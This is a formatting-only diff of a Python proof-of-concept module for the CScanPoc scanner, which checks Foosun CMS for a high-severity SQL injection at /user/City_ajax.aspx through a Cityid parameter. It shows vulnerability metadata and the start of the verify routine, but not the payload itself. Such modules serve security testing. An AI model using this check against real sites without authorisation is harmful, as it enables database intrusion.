@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Foosun_0002' # 平台漏洞编号，留空
+    vuln_id = 'Foosun_0002'  # 平台漏洞编号，留空
     name = '风讯CMS /user/City_ajax.aspx sql注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-11-04'  # 漏洞公布时间
     desc = '''
        风讯CMS /user/City_ajax.aspx sql注入漏洞。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '风讯CMS'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '0eb470ab-85d1-414d-b63c-ec9937b89d25'
@@ -31,8 +33,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer     :  http://www.wooyun.org/bugs/wooyun-2010-0150742
+
+            # refer     :  http://www.wooyun.org/bugs/wooyun-2010-0150742
             hh = hackhttp.hackhttp()
             arg = self.target
             url = arg + "/user/City_ajax.aspx?Cityid=1"
@@ -54,6 +56,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
